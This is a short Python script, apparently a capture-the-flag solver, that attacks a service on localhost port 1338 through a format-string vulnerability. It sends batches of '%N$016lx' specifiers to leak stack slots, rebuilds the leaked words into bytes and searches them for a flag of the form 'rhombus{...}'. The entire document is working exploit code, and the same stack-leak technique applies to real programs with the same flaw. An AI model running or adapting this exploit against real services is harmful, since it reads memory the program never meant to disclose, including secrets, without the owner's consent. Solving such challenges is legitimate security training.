#!/usr/bin/env python3
import re
import socket

leaked = bytearray()
# Read stack slots as fixed-width integers. Converting each little-endian word
# back to bytes reconstructs stack-resident strings without dereferencing
# arbitrary pointers.
for start in range(1, 49, 10):
    slots = list(range(start, min(start + 10, 49)))
    probe = ".".join(f"%{slot}$016lx" for slot in slots).encode() + b"\n"
    with socket.create_connection(("127.0.0.1", 1338)) as connection:
        connection.recv(4096)
        connection.sendall(probe)
        connection.shutdown(socket.SHUT_WR)
        response = b""
        while block := connection.recv(4096):
            response += block
    values = response.split(b"Forecast requested for ", 1)[1].splitlines()[0].split(b".")
    for value in values:
        leaked.extend(int(value, 16).to_bytes(8, "little"))

match = re.search(rb"rhombus\{[^}]+\}", leaked)
if not match:
    raise RuntimeError("flag not found in leaked stack slots")
print(match.group().decode())
